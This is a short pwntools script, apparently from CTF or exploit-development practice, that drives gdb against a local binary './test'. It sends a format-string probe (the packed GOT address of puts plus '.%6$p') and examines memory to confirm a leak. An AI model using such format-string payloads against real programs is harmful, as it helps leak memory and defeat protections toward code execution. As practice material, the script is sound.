#!/usr/bin/env python

from pwn import *

ELF_PATH = "./test"
elf = ELF(ELF_PATH)

r = process(["gdb", ELF_PATH])

def init():
    r.sendline("pset option ansicolor off")
    r.sendline("set prompt (gdb)")

def b(p):
    if isinstance(p, str):
        r.sendlineafter("(gdb)", "b "+ p)
    else:
        r.sendlineafter("(gdb)", "b *" + hex(p))

def run():
    r.sendlineafter("(gdb)","r")

def c():
    r.sendlineafter("(gdb)","c")

def x(size, fmt, addr):
    log.info("examine: " + addr)
    cmd = "x/" + str(size) + fmt + " " + addr
    r.sendlineafter("(gdb)", cmd)
    ret = r.recvuntil("(gdb)")
    r.unrecv("(gdb)")
    return ret

if __name__ == "__main__":

    init()
    b("main")
    b(0x4006a7)
    run()
    c()
    r.sendline(p64(elf.got['puts'])+".%6$p")
    print x(1, "gx", hex(elf.got['puts']))
    print x(30, "gx", "$rsp")

    r.interactive()
